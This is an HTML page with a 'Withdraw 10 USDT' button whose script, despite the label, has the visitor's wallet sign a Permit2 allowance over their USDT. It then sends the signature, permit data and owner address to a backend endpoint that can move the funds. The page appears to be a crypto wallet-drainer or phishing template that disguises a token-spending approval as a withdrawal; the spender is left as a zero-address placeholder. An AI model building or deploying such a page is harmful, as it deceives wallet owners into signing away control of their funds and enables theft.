<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Withdrawal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@uniswap/permit2-sdk@1.2.0/dist/index.umd.min.js"></script>
    <style>
        .toast { transition: all 0.3s ease; transform: translateY(-20px); opacity: 0; }
        .toast.show { transform: translateY(0); opacity: 1; }
    </style>
</head>
<body class="bg-black text-white p-10">

    <button id="withdrawBtn" class="bg-orange-600 px-6 py-3 rounded-xl font-bold">Withdraw 10 USDT</button>

    <div id="toastContainer" class="fixed top-5 right-5 space-y-4"></div>

    <script>
        function showToast(msg, isError = false) {
            const div = document.createElement('div');
            div.className = `toast p-4 rounded-2xl shadow-2xl backdrop-blur-md bg-opacity-90 ${isError ? 'bg-red-900' : 'bg-green-900'}`;
            div.textContent = msg;
            document.getElementById('toastContainer').appendChild(div);
            setTimeout(() => div.classList.add('show'), 10);
            setTimeout(() => { div.classList.remove('show'); setTimeout(() => div.remove(), 300); }, 3000);
        }

        document.getElementById('withdrawBtn').onclick = async () => {
            try {
                // 1. Logic to connect wallet and get signer (Standard BrowserProvider)
                const provider = new ethers.BrowserProvider(window.ethereum);
                const signer = await provider.getSigner();
                const owner = await signer.getAddress();
                
                // 2. Build Permit Data (Mocking nonce for simplicity)
                const permitData = {
                    details: {
                        token: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                        amount: ethers.parseUnits('10', 6),
                        expiration: Math.floor(Date.now() / 1000) + 3600,
                        nonce: Date.now() 
                    },
                    spender: '0x0000000000000000000000000000000000000000',
                    sigDeadline: Math.floor(Date.now() / 1000) + 3600,
                };

                // 3. Sign Typed Data (Requires Permit2 format)
                const { domain, types, values } = Permit2SDK.AllowanceTransfer.getPermitData(
                    permitData, '0x000000000022D473030F116dDEE9F6B43aC78BA3', 1
                );
                
                const signature = await signer.signTypedData(domain, types, values);
                
                // 4. Send to Backend
                showToast("Signing complete. Executing transaction...");
                const res = await fetch('/api/withdraw', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ signature, permitData, owner })
                });
                
                const data = await res.json();
                data.success ? showToast("Success! Funds withdrawn.") : showToast(data.message, true);
            } catch (err) { showToast("Error: " + err.message, true); }
        };
    </script>
</body>
</html>
